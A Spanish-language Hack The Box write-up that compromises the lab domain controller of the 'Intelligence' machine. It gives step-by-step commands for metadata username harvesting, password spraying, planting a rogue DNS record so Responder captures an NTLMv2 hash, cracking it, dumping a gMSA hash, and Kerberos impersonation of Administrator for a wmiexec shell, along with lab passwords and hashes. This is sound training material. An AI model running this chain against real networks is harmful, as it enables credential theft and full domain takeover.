---
layout: single
title: Inteligence - Hack The Box
excerpt: "Tocamos directorio activo"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-inteligence/inteligence1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - AD
  - Windows 
  - metadatos 
---

# 10.10.10.248  - Inteligence

![](/assets/images/htb-inteligence/inteligence1.png)

---------------------------

## Part 1: Reconocimiento inicial

Puertos abiertos -> `88(kerberos), 135(rcp), 139(netbios), 389,636(ldap), 445(smb), 464 ,593(rcp oer http), 636`   
Nmap nos dice que el dominio se llama **intelligence.htb** o **dc.intelligence.htb**.  
Como tenemos un nombre de dominio, lo añadimos al /etc/hosts.  

- El rpc no nos deja hacer nada sin credenciales `rpcclient -U "" 10.10.10.248 -N`  
- El smb igual `smbmap -H 10.10.10.248 -u "test" # [!] Authentication error on 10.10.10.248`    

Como tneemos el puerto 88 abierto intentamos hacer fuzzing de nombres:  
`kerbrute userenum --dc 10.10.10.248 -d intelligence.htb /usr/share/seclists/Usernames/Names/names.txt`  
Pero no da resultado.  

![](/assets/images/htb-inteligence/inteligence2.PNG)

En la web hay un formulario de contacto (poner el email), pero no da a ningun lado.  
La unica ruta que hay es /documents pero da error 403.  

---------------------------

## Part 2: Analizando los archivos

Hay una parte para descargas que lleva a varios pdfs:  
![](/assets/images/htb-inteligence/inteligence3.PNG)

```
http://intelligence.htb/documents/2020-01-01-upload.pdf  # Lo mismo
http://intelligence.htb/documents/2020-12-15-upload.pdf  # Texto de prueba en latin
```
![](/assets/images/htb-inteligence/inteligence4.PNG)
Como tenemos dos documentos que van de fechas del 1 de enero del 2020 al 15 diciembre del mismo año ¿Y entre medias?
```bash
#!/bin/bash

url="http://intelligence.htb/documents/2020"
for mes in {01..12}; do
	for dia in {01..32}; do
		echo $url-$mes-$dia-upload.pdf
	done; done
```
Este script nos crea todos los nombres posibles con todas las fechas posbiles:  
```console
└─$ ./dates.sh | tee paginas.txt
└─$ for page in $(cat paginas.txt); do curl -s $page -I | head -n 1 | grep -v 404 >/dev/null && echo $page; done
# Con este comando quitamos todas las que de error 404 o sea que no existan.
# siguen saliendo bastantes (84), las meteremos en un nuevo archivo "paginas_validas" con "tee"
# Intente hacer peticiones filtrando por campos como la fecha o el tamaño:
└─$ for page in $(cat paginas_validas.txt); do echo -n $page :  ; curl -s $page -I | awk 'FNR==4'; done
# Pero no encontre ninguno de otra fecha ni quitar tamaños repetidos (son unicos todos)
```
Solo queda tirar de exiftool, para eso se descargan todos los archivos: 
```console
└─$ for page in $(cat paginas_validas.txt); do wget $page; done;
└─$ for i in $(ls); do exiftool $i; done;  # cambia el tamaño y los nombres
└─$ for file in $(ls); do exiftool $file | tail -n1 | awk '{print $3}'; done | tee users.txt
└─$ cat users.txt | sort -u | sponge users.txt;
└─$ kerbrute userenum --dc 10.10.10.248 -d intelligence.htb ./users.txt  # Todos validos
```
Los archivos no se pueden leer directamente por ser pdfs, pero podemos convertidlos a txt: ```for i in $(ls); do pdftotext $i; done```  
Los archivos txt tienen tamaños diferentes cada uno. Uno de los textos (el ultimo), aunque no tenga la contraseña pone algo interesante:  
```
Actualización interna de IT
Recientemente ha habido algunas interrupciones en nuestros servidores web. 
Ted ha creado un script para nitifcarnos por si esto vuelve a pasar.
Además, después de la discusión sobre nuestra reciente auditoría de seguridad, estamos en proceso.
de bloquear nuestras cuentas de servicio.
```
Otro, (2020-06-04) tiene la contraseña ```NewIntelligenceCorpUser9876``` y dice que es la por defecto.  

-----------------------------------
## Part 3: Enumerando los otros servicios
 
Ya tenemos un fichero de usaurios existentes en el sistema. Ya que tenemos el puerto kerberos abierto podemos intentar solicitar un TGT por cada usuario. 
```console
└─$ impacket-GetNPUsers intelligence.htb/ -no-pass -usersfile ./users.txt
```
Dice que todos los usaurios tienen la preauth seteada, por lo que no obtenemos ningun hash NTLM que crackear. 
```console
└─$ crackmapexec smb 10.10.10.248 -u users.txt -p "NewIntelligenceCorpUser9876" --continue-on-success
SMB     10.10.10.248    445    DC  [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```
El otro ataque posible de kerberos es:
```console
└─$ impacket-GetUserSPNs intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
# Nada
```
Vamos a inspeccionar el rpc:
```console
└─$ rpcclient -U "Tiffany.Molina%NewIntelligenceCorpUser9876" 10.10.10.248  -c 'enumdomgroups'
	group:[Domain Admins] rid:[0x200]
└─$ rpcclient -U "Tiffany.Molina%NewIntelligenceCorpUser9876" 10.10.10.248  -c 'querygroupmem 0x200'
	rid:[0x1f4] attr:[0x7]
└─$ rpcclient -U "Tiffany.Molina%NewIntelligenceCorpUser9876" 10.10.10.248  -c 'queryuser 0x1f4'
	User Name   :	Administrator
└─$ rpcclient -U "Tiffany.Molina%NewIntelligenceCorpUser9876" 10.10.10.248  -c 'querydispinfo'
	# Nada interesante
```
Hay una herramienta llamada ldapdomaindump para conseguir una visual mas rapida del dominio.  
```console
└─$ ldapdomaindump -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.10.10.248
[*] Starting domain dump
[+] Domain dump finished
└─$ sudo python3 -m http.server 80
```
![](/assets/images/htb-inteligence/inteligence5.PNG)
![](/assets/images/htb-inteligence/inteligence6.PNG)

- Nuestra usuaria no esta en ningun grupo  
- No hay Remote Mangement Users por lo que nadie se puede conectar por winrm  

```console
└─$ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p 'NewIntelligenceCorpUser9876'
	IT                                                	READ ONLY
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
	Users                                             	READ ONLY

# El sysvol no tiene el groups.xml a si que nada
└─$ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p 'NewIntelligenceCorpUser9876' -r IT
└─$ smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p 'NewIntelligenceCorpUser9876' -d IT/downdetector.ps1
```
-------------------------------
## Part 4: Creación de un registro DNS 

El script es algo asi como: 
```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try { $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
} } catch {} }
```
De todos los DNS records se queda con los que empiecen por "web" y hace una peticion a ellos. 
Hay que crear un DNS malicioso que empiece por web y que se autentique a él para robar las creds: 
Se crea con este [script](https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py) 

```console
└─$ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webcucuxii -a add -t A -d 10.10.14.12 10.10.10.248
[-] Adding new record
[+] LDAP operation completed successfully
└─$ sudo python3 /usr/share/responder/Responder.py -I tun0
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3da0067bbcb69d07:63D3B7685DC7A676841D0D9075A7EE71:010100000...
```
Copie dichas creds y las rompí con el jhon
```console
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Mr.Teddy         (Ted.Graves)
```
-------------------------------
## Part 5: Escalando privilegios 

Tenemos un usaurio nuevo. 
La herramienta bloodhound nos ayudaría para seguir viendo como escalar privilegios.
```console
└─$ bloodhound-python -d intelligence.htb -u 'Ted.Graves' -p 'Mr.Teddy' -c all -ns 10.10.10.248 -v
INFO: Connecting to LDAP server: dc.intelligence.htb
└─$ ls 
 20221110183506_computers.json   20221110183506_groups.json
 20221110183506_domains.json     20221110183506_users.json
```
Estos archivos se importan en el bloodhound para hacer una visual de como mejorar los privilegios.  
Marcamos tanto a Ted como a Tiffany como "owned", entonces por "Shortest path from Owned principals" se puede ver como escalar desde ellos.  
- Ted.Graves, es miembro de IT support. Este grupo tiene el privilegio "ReadGMSAPassword" sobre svc_int.  

![](/assets/images/htb-inteligence/inteligence7.PNG)

Los usaurios del grupo **Group Managed Service Accounts** (GMSA, o sea svc_int) sus contraseñas son gestionadas y cambiadas cada cierto tiempo automaticamente 
(MSDS-ManagedPasswordInterval) por los Domain Controllers (en nuestro caso el grupo ITSupport), es decir estos leen la contraseña del GMSA y pueden impersonarlo 
por tanto. 
El GMSA suele estar logueado en el sistema, y si no, suele haber un demonio (tarea programada) que actue por él.

Para el ataque necesitamos ciertos datos: 
- Reloj a la hora de la maquina -> ```sudo service virtualbox-guest-utils stop; sudo ntpdate -s 10.10.10.248```  
- Allowed to delegate -> Bloodhound svc_int (usuario GMSA) Allowed To Delegate -> spn (WWW/dc.intelligence.htb)  
- Nombre de la computadora del GMSA -> ```pywerview get-netcomputer -u 'Ted.Graves' -t 10.10.10.248 -> svc_int.intelligence.htb```  
- Hash del GMSA -> ```python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb # svc_int$:::80c1d73...```  

```console
└─$ python3 /usr/share/doc/python3-impacket/examples/getST.py -spn WWW/dc.intelligence.htb \
-impersonate Administrator intelligence.htb/svc_int -hashes :80c1d736d9988b5763b9aa74362db287
# Hacemos que nuestro svc_int impersona al admin
└─$ export KRB5CCNAME=administrator.ccache
└─$ python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass dc.intelligence.htb
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator
C:\Users\Administrator\Desktop>type root.txt
b5ce8b6b098f4b16facfb68f95a8a38f
```
----------------------------------
## Extra Registros DNS

Los registros DNS (o archivos de zona) son archivos de instrucciones dentro de los servidores DNS que contienen información de un dominio (web), como su IP 
y su manera de gestionar las solicitudes.  

Estos registros son archivos de archivos de texto escritos en sintaxis DNS (un lenguaje propio de comandos que le indica que hacer al DNS).   
Todos los registros DNS tienen también un "TTL", que quiere decir "time-to-live" e indica con qué frecuencia el servidor DNS actualizará ese registro.  

- Registro A: registro que contiene la dirección IP de un dominio, es el mas sencillo.  
- AAAA: igual pero para ipv6  
